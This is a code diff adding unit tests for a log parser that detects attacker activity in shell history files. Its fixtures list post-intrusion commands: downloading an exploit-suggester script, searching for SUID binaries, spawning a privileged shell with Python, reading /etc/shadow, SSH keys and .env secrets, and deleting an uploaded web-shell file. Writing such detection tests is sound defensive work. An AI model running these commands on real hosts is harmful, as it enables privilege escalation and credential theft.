@@ -8,6 +8,8 @@ class ParserRegressionTests(unittest.TestCase):
             root.mkdir()
             inside = root / "auth.log"
             inside.write_text("Mar 15 10:01:00 host sshd: accepted password\n", encoding="utf-8")
+            shell_history = root / ".bash_history"
+            shell_history.write_text("id\ncat /etc/shadow\n", encoding="utf-8")
             hidden_dir = root / ".git"
             hidden_dir.mkdir()
             hidden_file = hidden_dir / "config"
@@ -24,6 +26,7 @@ class ParserRegressionTests(unittest.TestCase):
             files = collect_files([str(root)])
 
         self.assertIn(str(inside), files)
+        self.assertIn(str(shell_history), files)
         self.assertNotIn(str(hidden_file), files)
         if symlink_available:
             self.assertNotIn(str(link), files)
@@ -517,3 +520,56 @@ web_attacks:
             path.write_text(content, encoding="utf-8")
             forced = auto_parse(str(path), parser_name="generic")
         self.assertEqual(forced.log_type, "通用日志")
+
+    def test_shell_history_parser_extracts_attack_commands(self):
+        content = "\n".join([
+            "ls -la",
+            "whoami",
+            "wget https://example.test/linux-exploit-suggester.sh -O les.sh",
+            "sudo -l",
+            "find / -type f -user root -perm -4000 2>/dev/null",
+            "./usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+            "cat /etc/shadow",
+            "rm /var/www/html/uploads/x.phtml",
+        ]) + "\n"
+
+        result = parse_shell_history(content, ".bash_history")
+
+        self.assertEqual(result.log_type, "Shell History")
+        self.assertIn("shell-history", list_parser_names())
+        self.assertEqual(result.stats.total, 7)
+        tags = {tag for event in result.events for tag in event.tags}
+        self.assertIn("tool-download", tags)
+        self.assertIn("privilege-escalation", tags)
+        self.assertIn("linux-credential-file", tags)
+        self.assertIn("artifact-deletion", tags)
+        commands = [event.details.get("command") for event in result.events]
+        self.assertNotIn("ls -la", commands)
+
+    def test_shell_history_parser_detects_ssh_and_app_secret_reads(self):
+        content = "\n".join([
+            "less ~/.ssh/id_rsa",
+            "grep DB_PASSWORD /var/www/html/.env",
+            "tail -50 /srv/app/config.php",
+        ]) + "\n"
+
+        result = parse_shell_history(content, ".zsh_history")
+
+        self.assertEqual(result.stats.total, 3)
+        self.assertEqual({event.rule_name for event in result.events}, {"Linux 敏感凭据文件读取"})
+        self.assertEqual({event.details.get("action") for event in result.events}, {"credential-file-read"})
+        self.assertIn("T1552.004", {event.mitre_attack for event in result.events})
+
+    def test_parser_registry_detects_bash_history_file(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / ".bash_history"
+            path.write_text("id\nsudo -l\ncat /etc/shadow\n", encoding="utf-8")
+
+            result = auto_parse(str(path))
+
+        self.assertEqual(result.log_type, "Shell History")
+        self.assertEqual([event.rule_name for event in result.events], [
+            "主机信息枚举",
+            "提权命令痕迹",
+            "Linux 敏感凭据文件读取",
+        ])
